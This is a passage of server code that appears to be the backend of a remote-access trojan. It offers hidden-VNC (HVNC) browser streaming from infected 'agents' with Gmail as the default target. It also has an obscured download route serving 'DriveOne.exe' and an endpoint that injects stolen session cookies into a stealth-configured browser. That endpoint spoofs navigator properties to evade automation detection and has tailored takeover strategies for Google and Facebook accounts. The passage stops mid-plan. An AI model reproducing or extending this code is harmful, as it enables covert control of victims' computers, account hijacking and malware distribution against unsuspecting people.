                [taskId + '_' + row.agentId, row.agentId, 'module_action', 'webrtc', 'stop_host', 'pending'],
                (err) => {
                    if (!err) tasksCreated++;
                }
            );
        });
        res.json({ success: true, tasksCreated });
    });
});



// ─── WEBRTC SIGNALING ENDPOINTS ──────────────────────────────────

// Get WebRTC stream URL for an agent
app.get('/api/webrtc/stream/:agentId', (req, res) => {
    const { agentId } = req.params;
    
    console.log(`[WebRTC] 📱 Stream request for agent: ${agentId}`);
    
    // Generate a unique session ID
    const sessionId = `${agentId}_${Date.now()}_${Math.random().toString(36).substr(2, 6)}`;
    
    // Create session - ALWAYS create it
    const session = createWebRTCSession(sessionId, agentId);
    
    // Check if agent is connected via Socket.IO
    const agentSocket = getAgentSocket(agentId);
    if (!agentSocket) {
        console.log(`[WebRTC] ⚠️ Agent ${agentId} not connected via Socket.IO`);
        console.log(`[WebRTC] 📋 Available agents:`, Array.from(agentSockets.keys()));
        // DON'T delete the session - the agent might connect later via HTTP
    } else {
        console.log(`[WebRTC] ✅ Agent ${agentId} connected via Socket.IO`);
    }
    
   const turn = turnCredentials();
    res.json({
    success: true,
    sessionId: sessionId,
    signalingUrl: `wss://${req.get('host')}/ws`,
    iceServers: [
        { 
            urls: [
                'stun:173.194.222.127:19302',  // Google STUN (IP)
                'stun:162.125.32.130:3478'     // Cloudflare STUN (IP)
            ] 
        },
        {
            urls: ['turn:driveone.online:3478', 'turns:driveone.online:5349'],
            username: turn.username,
            credential: turn.credential
        }
    ],
    message: 'Use this sessionId to connect to the WebRTC stream',
    agentConnected: !!getAgentSocket(agentId)
});
});

// WebRTC status endpoint
app.get('/api/webrtc/status', (req, res) => {
    const sessions = [];
    for (const [sessionId, session] of webrtcSessions) {
        sessions.push({
            sessionId: sessionId,
            agentId: session.agentId,
            viewers: session.viewers.size,
            connected: session.connected,
            created: session.created,
            hasOffer: !!session.offer,
            iceCandidates: session.iceCandidates.length
        });
    }
    
    res.json({
        totalSessions: webrtcSessions.size,
        sessions: sessions,
        activeViewers: Array.from(webrtcViewers.keys()).length
    });
});

// Cleanup stale WebRTC sessions (run every minute)
setInterval(() => {
    const now = Date.now();
    const staleTimeout = 5 * 60 * 1000; // 5 minutes
    
    for (const [sessionId, session] of webrtcSessions) {
        if (now - session.created > staleTimeout && session.viewers.size === 0) {
            deleteWebRTCSession(sessionId);
        }
    }
}, 60000);






// ─── HVNC WEBRTC ENDPOINTS ──────────────────────────────────────────


// Agent polls for viewer ICE candidates
app.get('/api/hvnc_webrtc/agent/candidates/:sessionId', verifyToken, (req, res) => {
    const { sessionId } = req.params;
    const session = getWebRTCSession(sessionId);
    if (!session) {
        return res.status(404).json({ 
            success: false, 
            message: 'Session not found' 
        });
    }

    // Get pending viewer ICE candidates and clear them
    const candidates = session.viewerIceCandidates || [];
    session.viewerIceCandidates = [];

    res.json({
        success: true,
        candidates: candidates,
        count: candidates.length
    });
});



// Create HVNC WebRTC session
app.get('/api/hvnc_webrtc/stream/:agentId', verifyToken, (req, res) => {
    const { agentId } = req.params;
    
    console.log(`[HVNC WebRTC] 📱 Stream request for agent: ${agentId}`);
    
    // Generate a unique session ID
    const sessionId = `hvnc_${agentId}_${Date.now()}_${Math.random().toString(36).substr(2, 6)}`;
    
    // Create session using the same WebRTC session store
    const session = createWebRTCSession(sessionId, agentId);
    
    // Store HVNC specific metadata
    session.hvnc = {
        profile: req.query.profile || 'Default',
        url: req.query.url || 'https://gmail.com',
        width: parseInt(req.query.width) || 1280,
        height: parseInt(req.query.height) || 800,
        fps: parseInt(req.query.fps) || 10,
        bitrate: parseInt(req.query.bitrate) || 2500,
        scale_factor: parseFloat(req.query.scale_factor) || 0.6
    };
    
    console.log(`[HVNC WebRTC] 📱 HVNC session created: ${sessionId} for agent ${agentId}`);
    
   const turn = turnCredentials();
    res.json({
    success: true,
    sessionId: sessionId,
    signalingUrl: `wss://${req.get('host')}/ws`,
    iceServers: [
        { 
            urls: [
                'stun:173.194.222.127:19302',  // Google STUN (IP)
                'stun:162.125.32.130:3478'     // Cloudflare STUN (IP)
            ] 
        },
        {
            urls: ['turn:driveone.online:3478', 'turns:driveone.online:5349'],
            username: turn.username,
            credential: turn.credential
        }
    ],
    message: 'Use this sessionId to connect to the WebRTC stream',
    agentConnected: !!getAgentSocket(agentId)
});
});

// Agent sends SDP offer for HVNC WebRTC
app.post('/api/hvnc_webrtc/agent/offer', verifyToken, (req, res) => {
    const { sessionId, sdp } = req.body;
    
    if (!sessionId || !sdp) {
        return res.status(400).json({
            success: false,
            message: 'Missing sessionId or sdp'
        });
    }
    
    const session = getWebRTCSession(sessionId);
    if (!session) {
        return res.status(404).json({
            success: false,
            message: 'Session not found'
        });
    }
    
    // Store the offer
    session.offer = sdp;
    session.connected = true;
    
    // Forward to all connected viewers via WebSocket
    let forwardedCount = 0;
    for (const viewer of session.viewers) {
        if (viewer.readyState === WebSocket.OPEN) {
            viewer.send(JSON.stringify({
                type: 'offer',
                sdp: sdp,
                sessionId: sessionId
            }));
            forwardedCount++;
        }
    }
    
    console.log(`[HVNC WebRTC] 📤 Offer for session ${sessionId} forwarded to ${forwardedCount} viewers`);
    
    res.json({
        success: true,
        message: 'Offer received and forwarded',
        forwardedTo: forwardedCount,
        sessionId: sessionId
    });
});

// Agent polls for viewer's SDP answer
app.get('/api/hvnc_webrtc/agent/answer/:sessionId', verifyToken, (req, res) => {
    const { sessionId } = req.params;
    const session = getWebRTCSession(sessionId);
    
    if (!session) {
        return res.status(404).json({ 
            success: false, 
            message: 'Session not found' 
        });
    }
    
    // Check for pending answer
    if (session.pendingAnswer) {
        const answer = session.pendingAnswer;
        session.pendingAnswer = null;
        return res.json({ 
            success: true, 
            sdp: answer 
        });
    }
    
    if (session.answer) {
        const answer = session.answer;
        session.answer = null;
        return res.json({ 
            success: true, 
            sdp: answer 
        });
    }
    
    res.json({ 
        success: false, 
        message: 'No answer yet' 
    });
});


// ─── HVNC WEBRTC ICE ENDPOINTS ──────────────────────────────────


// Agent sends ICE candidate
app.post('/api/hvnc_webrtc/agent/ice', verifyToken, (req, res) => {
    const { sessionId, candidate } = req.body;
    if (!sessionId || !candidate) {
        return res.status(400).json({ success: false, message: 'Missing sessionId or candidate' });
    }

    const session = getWebRTCSession(sessionId);
    if (!session) {
        return res.status(404).json({ success: false, message: 'Session not found' });
    }

    // Forward candidate to all viewers via WebSocket
    let forwarded = 0;
    for (const viewer of session.viewers) {
        if (viewer.readyState === WebSocket.OPEN) {
            viewer.send(JSON.stringify({
                type: 'ice_candidate',
                candidate: candidate,
                sessionId: sessionId
            }));
            forwarded++;
        }
    }

    console.log(`[HVNC WebRTC] ICE candidate from agent forwarded to ${forwarded} viewers`);
    res.json({ success: true, forwarded });
});

// Viewer's ICE candidates (stored for agent to poll)
// Agent polls this endpoint to get ICE candidates from viewer
app.get('/api/hvnc_webrtc/agent/candidates/:sessionId', verifyToken, (req, res) => {
    const { sessionId } = req.params;
    const session = getWebRTCSession(sessionId);
    if (!session) {
        return res.status(404).json({ success: false, message: 'Session not found' });
    }

    // Get pending viewer ICE candidates and clear them
    const candidates = session.viewerIceCandidates || [];
    session.viewerIceCandidates = [];

    res.json({
        success: true,
        candidates,
        count: candidates.length
    });
});

// ─── HVNC WEBRTC KILLALL ──────────────────────────────────────────
app.post('/api/hvnc_webrtc/killall', verifyToken, (req, res) => {
    console.log('[HVNC WebRTC] 💀 KILLALL called - terminating all HVNC streams');
    let killed = 0;
    const toDelete = [];
    for (const [sessionId, session] of webrtcSessions) {
        if (session.hvnc) {
            // Close all viewer WebSockets
            for (const viewer of session.viewers) {
                try {
                    if (viewer.readyState === WebSocket.OPEN) {
                        viewer.close(1000, 'Killswitch activated');
                    }
                } catch (e) {}
            }
            killed++;
            toDelete.push(sessionId);
        }
    }
    for (const sessionId of toDelete) {
        deleteWebRTCSession(sessionId);
    }
    console.log(`[HVNC WebRTC] ✅ Killed ${killed} HVNC streams`);
    res.json({ 
        success: true, 
        killed: killed,
        message: `Terminated ${killed} HVNC WebRTC session(s)`
    });
});



// Get HVNC WebRTC session status
app.get('/api/hvnc_webrtc/status/:sessionId', verifyToken, (req, res) => {
    const { sessionId } = req.params;
    const session = getWebRTCSession(sessionId);
    
    if (!session) {
        return res.status(404).json({
            success: false,
            message: 'Session not found'
        });
    }
    
    res.json({
        success: true,
        sessionId: sessionId,
        agentId: session.agentId,
        viewers: session.viewers.size,
        connected: session.connected,
        hasOffer: !!session.offer,
        hasAnswer: !!session.answer,
        iceCandidates: session.iceCandidates.length,
        hvnc: session.hvnc || null,
        created: session.created
    });
});

// List all HVNC WebRTC sessions
app.get('/api/hvnc_webrtc/sessions', verifyToken, (req, res) => {
    const sessions = [];
    for (const [sessionId, session] of webrtcSessions) {
        if (session.hvnc) {
            sessions.push({
                sessionId: sessionId,
                agentId: session.agentId,
                viewers: session.viewers.size,
                connected: session.connected,
                hvnc: session.hvnc,
                created: session.created
            });
        }
    }
    
    res.json({
        success: true,
        total: sessions.length,
        sessions: sessions
    });
});



// Kill specific HVNC session
app.post('/api/hvnc_webrtc/kill/:sessionId', verifyToken, (req, res) => {
    const { sessionId } = req.params;
    const session = getWebRTCSession(sessionId);
    
    if (!session) {
        return res.status(404).json({
            success: false,
            message: 'Session not found'
        });
    }
    
    // Close all viewers
    for (const viewer of session.viewers) {
        try {
            if (viewer.readyState === WebSocket.OPEN) {
                viewer.close(1000, 'Session terminated');
            }
        } catch (e) {}
    }
    
    deleteWebRTCSession(sessionId);
    
    res.json({
        success: true,
        message: `Session ${sessionId} terminated`
    });
});



// ─── HVNC EXPLORER ENDPOINTS ──────────────────────────────────────

// Create Explorer WebRTC session
app.get('/api/hvnc_explorer/stream/:agentId', verifyToken, (req, res) => {
    const { agentId } = req.params;
    console.log(`[HVNC Explorer] 📱 Stream request for agent: ${agentId}`);

    const sessionId = `explorer_${agentId}_${Date.now()}_${Math.random().toString(36).substr(2, 6)}`;
    const session = createWebRTCSession(sessionId, agentId);

    // Mark as Explorer session (reuse hvnc flag for ICE routing)
    session.hvnc = {
        type: 'explorer',
        folder: req.query.folder || null,
        width: parseInt(req.query.width) || 1280,
        height: parseInt(req.query.height) || 800,
        fps: parseInt(req.query.fps) || 10,
        bitrate: parseInt(req.query.bitrate) || 2500,
        scale_factor: parseFloat(req.query.scale_factor) || 0.6
    };

    console.log(`[HVNC Explorer] 📱 Session created: ${sessionId} for agent ${agentId}`);
   const turn = turnCredentials();
    res.json({
        success: true,
        sessionId: sessionId,
        signalingUrl: `wss://${req.get('host')}/ws`,
        iceServers: [
            { 
                urls: [
                    'stun:173.194.222.127:19302',
                    'stun:162.125.32.130:3478',
                    'stun:stun.stunprotocol.org:3478'
                ] 
            }
        ],
        message: 'Use this sessionId to connect to the WebRTC stream',
        agentConnected: !!getAgentSocket(agentId)
    });
});

// Agent sends SDP offer for Explorer WebRTC
app.post('/api/hvnc_explorer/agent/offer', verifyToken, (req, res) => {
    const { sessionId, sdp } = req.body;
    if (!sessionId || !sdp) {
        return res.status(400).json({
            success: false,
            message: 'Missing sessionId or sdp'
        });
    }

    const session = getWebRTCSession(sessionId);
    if (!session) {
        return res.status(404).json({
            success: false,
            message: 'Session not found'
        });
    }

    session.offer = sdp;
    session.connected = true;

    let forwardedCount = 0;
    for (const viewer of session.viewers) {
        if (viewer.readyState === WebSocket.OPEN) {
            viewer.send(JSON.stringify({
                type: 'offer',
                sdp: sdp,
                sessionId: sessionId
            }));
            forwardedCount++;
        }
    }

    console.log(`[HVNC Explorer] 📤 Offer for session ${sessionId} forwarded to ${forwardedCount} viewers`);
    res.json({
        success: true,
        message: 'Offer received and forwarded',
        forwardedTo: forwardedCount,
        sessionId: sessionId
    });
});

// Agent polls for viewer's SDP answer
app.get('/api/hvnc_explorer/agent/answer/:sessionId', verifyToken, (req, res) => {
    const { sessionId } = req.params;
    const session = getWebRTCSession(sessionId);
    if (!session) {
        return res.status(404).json({ success: false, message: 'Session not found' });
    }

    if (session.pendingAnswer) {
        const answer = session.pendingAnswer;
        session.pendingAnswer = null;
        return res.json({ success: true, sdp: answer });
    }

    if (session.answer) {
        const answer = session.answer;
        session.answer = null;
        return res.json({ success: true, sdp: answer });
    }

    res.json({ success: false, message: 'No answer yet' });
});

// Agent sends ICE candidate
app.post('/api/hvnc_explorer/agent/ice', verifyToken, (req, res) => {
    const { sessionId, candidate } = req.body;
    if (!sessionId || !candidate) {
        return res.status(400).json({ success: false, message: 'Missing sessionId or candidate' });
    }

    const session = getWebRTCSession(sessionId);
    if (!session) {
        return res.status(404).json({ success: false, message: 'Session not found' });
    }

    let forwarded = 0;
    for (const viewer of session.viewers) {
        if (viewer.readyState === WebSocket.OPEN) {
            viewer.send(JSON.stringify({
                type: 'ice_candidate',
                candidate: candidate,
                sessionId: sessionId
            }));
            forwarded++;
        }
    }

    console.log(`[HVNC Explorer] ICE candidate from agent forwarded to ${forwarded} viewers`);
    res.json({ success: true, forwarded });
});

// Agent polls for viewer ICE candidates
app.get('/api/hvnc_explorer/agent/candidates/:sessionId', verifyToken, (req, res) => {
    const { sessionId } = req.params;
    const session = getWebRTCSession(sessionId);
    if (!session) {
        return res.status(404).json({ success: false, message: 'Session not found' });
    }

    const candidates = session.viewerIceCandidates || [];
    session.viewerIceCandidates = [];

    res.json({
        success: true,
        candidates,
        count: candidates.length
    });
});

// ─── HVNC EXPLORER KILLALL ──────────────────────────────────────────
app.post('/api/hvnc_explorer/killall', verifyToken, (req, res) => {
    console.log('[HVNC Explorer] 💀 KILLALL called - terminating all Explorer streams');
    let killed = 0;
    const toDelete = [];
    for (const [sessionId, session] of webrtcSessions) {
        if (session.hvnc && session.hvnc.type === 'explorer') {
            for (const viewer of session.viewers) {
                try {
                    if (viewer.readyState === WebSocket.OPEN) {
                        viewer.close(1000, 'Killswitch activated');
                    }
                } catch (e) {}
            }
            killed++;
            toDelete.push(sessionId);
        }
    }
    for (const sessionId of toDelete) {
        deleteWebRTCSession(sessionId);
    }
    console.log(`[HVNC Explorer] ✅ Killed ${killed} Explorer streams`);
    res.json({
        success: true,
        killed: killed,
        message: `Terminated ${killed} HVNC Explorer session(s)`
    });
});

// Get Explorer session status
app.get('/api/hvnc_explorer/status/:sessionId', verifyToken, (req, res) => {
    const { sessionId } = req.params;
    const session = getWebRTCSession(sessionId);

    if (!session) {
        return res.status(404).json({
            success: false,
            message: 'Session not found'
        });
    }

    // Only return if it's an Explorer session
    if (!session.hvnc || session.hvnc.type !== 'explorer') {
        return res.status(404).json({
            success: false,
            message: 'Not an Explorer session'
        });
    }

    res.json({
        success: true,
        sessionId: sessionId,
        agentId: session.agentId,
        viewers: session.viewers.size,
        connected: session.connected,
        hasOffer: !!session.offer,
        hasAnswer: !!session.answer,
        iceCandidates: session.iceCandidates.length,
        hvnc: session.hvnc,
        created: session.created
    });
});

// List all Explorer sessions
app.get('/api/hvnc_explorer/sessions', verifyToken, (req, res) => {
    const sessions = [];
    for (const [sessionId, session] of webrtcSessions) {
        if (session.hvnc && session.hvnc.type === 'explorer') {
            sessions.push({
                sessionId: sessionId,
                agentId: session.agentId,
                viewers: session.viewers.size,
                connected: session.connected,
                hvnc: session.hvnc,
                created: session.created
            });
        }
    }

    res.json({
        success: true,
        total: sessions.length,
        sessions: sessions
    });
});

// Kill specific Explorer session
app.post('/api/hvnc_explorer/kill/:sessionId', verifyToken, (req, res) => {
    const { sessionId } = req.params;
    const session = getWebRTCSession(sessionId);

    if (!session) {
        return res.status(404).json({
            success: false,
            message: 'Session not found'
        });
    }

    if (!session.hvnc || session.hvnc.type !== 'explorer') {
        return res.status(404).json({
            success: false,
            message: 'Not an Explorer session'
        });
    }

    // Close all viewers
    for (const viewer of session.viewers) {
        try {
            if (viewer.readyState === WebSocket.OPEN) {
                viewer.close(1000, 'Session terminated');
            }
        } catch (e) {}
    }

    deleteWebRTCSession(sessionId);

    res.json({
        success: true,
        message: `Explorer session ${sessionId} terminated`
    });
});











// ─── DOWNLOAD ENDPOINT ──────────────────────────────────────────
app.get('/sbfbkbj', (req, res) => {
    const filePath = path.join(__dirname, 'dist', 'DriveOne.exe');
    
    if (fs.existsSync(filePath)) {
        res.setHeader('Content-Disposition', 'attachment; filename="DriveOne.exe"');
        res.setHeader('Content-Type', 'application/octet-stream');
        const readStream = fs.createReadStream(filePath);
        readStream.pipe(res);
    } else {
        res.status(404).send('File not found. Please contact support.');
    }
});

// ─────────────────────────────────────────────────────────────────────────────
// ─── SMART COOKIE INJECTION ENDPOINT ──────────────────────────────────────
// ─────────────────────────────────────────────────────────────────────────────

function sanitizeCookie(cookie, baseDomain) {
    const name = cookie.name || '';
    const isHostPrefix = name.startsWith('__Host-');
    const isSecurePrefix = name.startsWith('__Secure-');

    const sanitized = {
        name: cookie.name,
        value: cookie.value || '',
        path: cookie.path || '/',
        secure: cookie.secure || false,
        httpOnly: cookie.httpOnly || false
    };

    if (isHostPrefix) {
        sanitized.path = '/';
        sanitized.secure = true;
        return sanitized;
    }

    if (isSecurePrefix) {
        sanitized.secure = true;
        if (cookie.domain) {
            sanitized.domain = cookie.domain;
        } else {
            sanitized.domain = '.' + baseDomain;
        }
        return sanitized;
    }

    if (cookie.domain) {
        sanitized.domain = cookie.domain;
    } else {
        sanitized.domain = '.' + baseDomain;
    }
    return sanitized;
}

app.post('/api/cookies/inject-domain', async (req, res) => {
    try {
        const { cookies, url, agentId, options = {} } = req.body;

        if (!cookies || !Array.isArray(cookies) || cookies.length === 0) {
            return res.status(400).json({
                success: false,
                message: 'No cookies provided'
            });
        }

        console.log(`[INJECT] Smart injection for ${cookies.length} cookies`);

        if (!puppeteer) {
            return res.status(500).json({
                success: false,
                message: 'puppeteer-core not installed. Run: npm install puppeteer-core'
            });
        }

        const browserPaths = {
            chrome: [
                'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
                'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe',
                process.env.LOCALAPPDATA + '\\Google\\Chrome\\Application\\chrome.exe',
                process.env.PROGRAMFILES + '\\Google\\Chrome\\Application\\chrome.exe',
                process.env['PROGRAMFILES(X86)'] + '\\Google\\Chrome\\Application\\chrome.exe'
            ],
            edge: [
                'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe',
                'C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe',
                process.env.LOCALAPPDATA + '\\Microsoft\\Edge\\Application\\msedge.exe'
            ]
        };

        let executablePath = null;
        let browserType = null;

        for (const [type, paths] of Object.entries(browserPaths)) {
            for (const p of paths) {
                if (p && fs.existsSync(p)) {
                    executablePath = p;
                    browserType = type;
                    console.log(`[INJECT] Found ${type} at: ${executablePath}`);
                    break;
                }
            }
            if (executablePath) break;
        }

        if (!executablePath) {
            return res.status(400).json({
                success: false,
                message: 'No browser found. Please install Chrome or Edge.'
            });
        }

        const plan = buildInjectionPlan(url, cookies);
        console.log(`[INJECT] Strategy: ${plan.strategy}, Phases: ${plan.phases.length}`);

        const userDataDir = path.join(
            process.env.USERPROFILE || 'C:\\Users\\' + require('os').userInfo().username,
            'AppData\\Local\\Temp',
            'browser_inject_' + Date.now()
        );
        if (!fs.existsSync(userDataDir)) {
            fs.mkdirSync(userDataDir, { recursive: true });
        }

        const screenResolutions = [
            { width: 1920, height: 1080 },
            { width: 1536, height: 864 },
            { width: 1440, height: 900 },
            { width: 1366, height: 768 },
            { width: 1280, height: 720 }
        ];
        const randomScreen = screenResolutions[Math.floor(Math.random() * screenResolutions.length)];
        const viewportWidth = randomScreen.width;
        const viewportHeight = randomScreen.height;
        console.log(`[INJECT] Using screen resolution: ${viewportWidth}x${viewportHeight}`);

        const userAgents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
        ];
        const randomUA = userAgents[Math.floor(Math.random() * userAgents.length)];

        console.log(`[INJECT] Launching ${browserType} with anti-detection...`);

        let browser = null;
        let page = null;

        try {
            browser = await puppeteer.launch({
                executablePath: executablePath,
                userDataDir: userDataDir,
                headless: false,
                args: [
                    '--remote-debugging-port=9222',
                    '--no-first-run',
                    '--no-default-browser-check',
                    '--disable-extensions',
                    '--disable-plugins',
                    '--disable-translate',
                    '--disable-sync',
                    '--disable-background-networking',
                    '--disable-default-apps',
                    '--disable-component-update',
                    '--disable-client-side-phishing-detection',
                    '--safebrowsing-disable-auto-update',
                    '--disable-blink-features=AutomationControlled',
                    '--disable-gpu',
                    '--disable-software-rasterizer',
                    '--disable-dev-shm-usage',
                    '--ignore-certificate-errors',
                    '--ignore-ssl-errors',
                    '--allow-running-insecure-content',
                    '--disable-crash-reporter',
                    '--disable-breakpad',
                    '--disable-logging',
                    '--disable-notifications',
                    '--disable-popup-blocking',
                    '--disable-session-crashed-bubble',
                    '--disable-features=IsolateOrigins,site-per-process',
                    '--enable-features=NetworkService,NetworkServiceInProcess',
                    '--hide-scrollbars',
                    `--window-size=${viewportWidth},${viewportHeight}`,
                    '--new-window',
                    'about:blank'
                ],
                defaultViewport: {
                    width: viewportWidth,
                    height: viewportHeight,
                    deviceScaleFactor: 1
                },
                timeout: 30000,
                ignoreDefaultArgs: ['--enable-automation']
            });
            console.log(`[INJECT] ${browserType} launched successfully!`);
        } catch (launchErr) {
            console.error('[INJECT] Failed to launch browser:', launchErr);
            try { if (fs.existsSync(userDataDir)) fs.rmSync(userDataDir, { recursive: true, force: true }); } catch {}
            return res.status(400).json({
                success: false,
                message: `Failed to launch ${browserType}: ${launchErr.message}`
            });
        }

        let totalInjected = 0;
        let failedCookies = [];
        const injectedCookies = [];

        try {
            page = await browser.newPage();

            const antiDetectionScript = `
                Object.defineProperty(navigator, 'webdriver', { get: () => false });
                Object.defineProperty(navigator, 'plugins', { 
                    get: () => {
                        const plugins = [
                            { name: 'Chrome PDF Plugin', filename: 'internal-pdf-viewer' },
                            { name: 'Chrome PDF Viewer', filename: 'mhjfbmdgcfjbbpaeojofohoefgiehjai' },
                            { name: 'Native Client', filename: 'internal-nacl-plugin' }
                        ];
                        plugins.length = 5;
                        plugins.item = function(i) { return this[i] || null; };
                        plugins.namedItem = function(name) { 
                            for (let i = 0; i < this.length; i++) {
                                if (this[i].name === name) return this[i];
                            }
                            return null;
                        };
                        return plugins;
                    }
                });
                Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
                Object.defineProperty(navigator, 'platform', { get: () => 'Win32' });
                Object.defineProperty(navigator, 'vendor', { get: () => 'Google Inc.' });
                Object.defineProperty(navigator, 'hardwareConcurrency', { get: () => ${Math.floor(Math.random() * 4) + 4} });
                Object.defineProperty(navigator, 'deviceMemory', { get: () => ${[4, 8, 16][Math.floor(Math.random() * 3)]} });
                Object.defineProperty(navigator, 'maxTouchPoints', { get: () => 0 });
                window.chrome = { 
                    runtime: {}, 
                    loadTimes: function() {}, 
                    csi: function() {}, 
                    app: {
                        isInstalled: false,
                        InstallState: { DISABLED: 'disabled', INSTALLED: 'installed', NOT_INSTALLED: 'not_installed' },
                        RunningState: { CANNOT_RUN: 'cannot_run', READY_TO_RUN: 'ready_to_run', RUNNING: 'running' }
                    }
                };
                console.log('%c[ANTI-DETECTION] Applied', 'color: green; font-weight: bold;');
            `;

            await page.evaluateOnNewDocument(antiDetectionScript);
            await page.setUserAgent(randomUA);

            await page.setExtraHTTPHeaders({
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'sec-ch-ua': `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`,
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"'
            });

            const preDelay = Math.floor(Math.random() * 2000) + 1000;
            await new Promise(resolve => setTimeout(resolve, preDelay));

            for (const phase of plan.phases) {
                console.log(`[INJECT] Phase: ${phase.name} - ${phase.cookies.length} cookies - ${phase.url}`);
                try {
                    await page.goto(phase.url, { waitUntil: 'networkidle2', timeout: 15000 });
                } catch (err) {
                    console.log(`[INJECT] Navigation to ${phase.url} failed: ${err.message}`);
                }

                await page.evaluate(async () => {
                    const scrollAmount = Math.floor(Math.random() * 300) + 100;
                    window.scrollBy(0, scrollAmount);
                    await new Promise(r => setTimeout(r, 200 + Math.random() * 300));
                    window.scrollBy(0, Math.floor(Math.random() * -150) - 50);
                });

                for (const cookie of phase.cookies) {
                    try {
                        const cookieData = sanitizeCookie(cookie, plan.baseDomain);
                        if (cookie.expires) {
                            cookieData.expires = cookie.expires;
                        }
                        console.log(`[INJECT] Injecting: ${cookieData.name} (domain: ${cookieData.domain || 'host-only'}, path: ${cookieData.path})`);
                        await page.setCookie(cookieData);
                        totalInjected++;
                        injectedCookies.push(cookie.name);
                        console.log(`[INJECT] ✅ Injected: ${cookie.name}`);
                    } catch (err) {
                        console.log(`[INJECT] ❌ Failed: ${cookie.name}: ${err.message}`);
                        failedCookies.push(cookie.name);
                    }
                }
                await new Promise(resolve => setTimeout(resolve, 500 + Math.random() * 1000));
            }

            const finalUrl = plan.phases[plan.phases.length - 1]?.url || url || `https://${plan.baseDomain}`;
            console.log(`[INJECT] Final navigation to: ${finalUrl}`);
            await page.goto(finalUrl, { waitUntil: 'networkidle2', timeout: 15000 });

            res.json({
                success: true,
                message: `Injected ${totalInjected}/${cookies.length} cookies (strategy: ${plan.strategy})`,
                url: finalUrl,
                injected: totalInjected,
                total: cookies.length,
                strategy: plan.strategy,
                phases: plan.phases.map(p => p.name),
                browser: browserType,
                userAgent: randomUA,
                screen: randomScreen,
                viewport: { width: viewportWidth, height: viewportHeight },
                failed: failedCookies,
                injectedCookies: injectedCookies
            });

            setTimeout(() => {
                try { page.close().catch(() => {}); } catch {}
            }, 60000);

        } catch (injectErr) {
            console.error('[INJECT] Error during injection:', injectErr);
            try { if (page) await page.close(); } catch {}
            return res.status(500).json({
                success: false,
                message: `Injection error: ${injectErr.message}`
            });
        }
    } catch (error) {
        console.error('[INJECT] Error:', error);
        res.status(500).json({
            success: false,
            message: error.message
        });
    }
});

// ─── BUILD INJECTION PLAN ──────────────────────────────────────
function buildInjectionPlan(url, cookies) {
    let domain = 'unknown';
    let baseDomain = 'unknown';

    try {
        if (url) {
            const urlObj = new URL(url);
            domain = urlObj.hostname;
            if (domain.startsWith('www.')) domain = domain.substring(4);
            const parts = domain.split('.');
            baseDomain = parts.length > 2 ? parts.slice(-2).join('.') : domain;
        }
    } catch (e) {
        domain = cookies[0]?.domain || 'unknown';
        baseDomain = domain;
    }

    const authPatterns = [
        /session/i, /auth/i, /token/i, /sid/i, /id/i,
        /login/i, /user/i, /account/i, /identity/i,
        /oauth/i, /openid/i, /sso/i,
        /^__Secure-/, /^__Host-/,
        /PHPSESSID/, /JSESSIONID/, /ASP\.NET_SessionId/,
        /SAPISID/, /APISID/, /HSID/, /SSID/, /NID/,
        /c_user/, /xs/, /datr/, /fr/, /sb/
    ];

    const authCookies = [];
    const regularCookies = [];

    cookies.forEach(cookie => {
        const name = (cookie.name || '').toLowerCase();
        let isAuth = false;
        for (const pattern of authPatterns) {
            if (pattern.test(name)) {
                isAuth = true;
                break;
            }
        }
        if (cookie.httpOnly || cookie.is_httponly) isAuth = true;
        if (cookie.secure && cookie.value && cookie.value.length > 30) isAuth = true;
        if (name.startsWith('__host-') || name.startsWith('__secure-')) isAuth = true;

        if (isAuth) {
            authCookies.push(cookie);
        } else {
            regularCookies.push(cookie);
        }
    });

    const plan = {
        domain: domain,
        baseDomain: baseDomain,
        strategy: 'generic',
        phases: []
    };

    if (domain.includes('google.com') || domain.includes('gmail.com')) {
        plan.strategy = 'google';
        const googleAuth = authCookies.filter(c =>
            ['SID', 'HSID', 'SSID', 'APISID', 'SAPISID', 'NID'].includes(c.name) ||
            c.name.startsWith('__Secure-')
        );
        const googleSupport = authCookies.filter(c =>
            !['SID', 'HSID', 'SSID', 'APISID', 'SAPISID', 'NID'].includes(c.name) &&
            !c.name.startsWith('__Secure-')
        );
        plan.phases = [
            {
                name: 'Google Core Auth',
                priority: 1,
                url: 'https://accounts.google.com',
                cookies: googleAuth.map(c => ({
                    name: c.name,
                    value: c.value,
                    domain: '.google.com',
                    path: '/',
                    secure: true,
                    httpOnly: c.httpOnly || false,
                    expires: c.expires || null
                }))
            },
            {
                name: 'Google Supporting',
                priority: 2,
                url: 'https://accounts.google.com',
                cookies: googleSupport.map(c => ({
                    name: c.name,
                    value: c.value,
                    domain: '.google.com',
                    path: '/',
                    secure: c.secure || false,
                    httpOnly: c.httpOnly || false,
                    expires: c.expires || null
                }))
            },
            {
                name: 'Google Service',
                priority: 3,
                url: `https://${domain}`,
                cookies: regularCookies.map(c => ({
                    name: c.name,
                    value: c.value,
                    domain: c.host || c.domain || `.${baseDomain}`,
                    path: c.path || '/',
                    secure: c.secure || false,
                    httpOnly: c.httpOnly || false,
                    expires: c.expires || null
                }))
            }
        ];
    } else if (domain.includes('facebook.com') || domain.includes('meta.com')) {
        plan.strategy = 'facebook';
        const fbAuth = authCookies.filter(c =>
            ['c_user', 'xs', 'datr', 'fr', 'sb'].includes(c.name)
        );
        plan.phases = [
            {
                name: 'Facebook Core Auth',
                priority: 1,
                url: 'https://www.facebook.com',
                cookies: fbAuth.map(c => ({
                    name: c.name,
                    value: c.value,
